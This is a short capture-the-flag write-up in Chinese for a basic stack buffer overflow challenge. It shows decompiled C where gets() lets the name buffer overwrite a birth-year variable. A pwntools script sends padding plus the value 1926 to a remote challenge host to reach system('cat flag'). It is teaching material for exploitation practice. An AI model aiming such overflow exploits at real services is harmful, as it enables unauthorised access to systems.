拖入ida， main 中关键代码


```c
int main() {
  __int64 result; // rax
  char v4; // [rsp+0h] [rbp-20h] // 这里 -20h, 可以双击进入看
  unsigned int v5; // [rsp+8h] [rbp-18h] // -18h, v4值是在v5上面
  unsigned __int64 v6; // [rsp+18h] [rbp-8h]
  ...

  if ( v5 == 1926 )
  {
    puts("You Cannot Born In 1926!");
    result = 0LL;
  }
  else
  {
    puts("What's Your Name?");
    gets(&v4);
    printf("You Are Born In %d\n", v5);
    if ( v5 == 1926 )
    {
      puts("You Shall Have Flag.");
      system("cat flag");
    }
    else
    {
      puts("You Are Naive.");
      puts("You Speed One Second Here.");
    }
    result = 0LL;
  }
}
```
v5前面！=1926，后面要=1926才行。

由于 v4在v5上面。 使用v4覆盖v5地址。


```python
from pwn import *
io = remote('124.126.19.106',32143)


io.recvuntil("Your Birth")
io.sendline('123')
io.recvuntil("Your Name")
io.sendline(flat('a'*(0x20-0x18), p64(1926)))
io.interactive()
io.close()
```

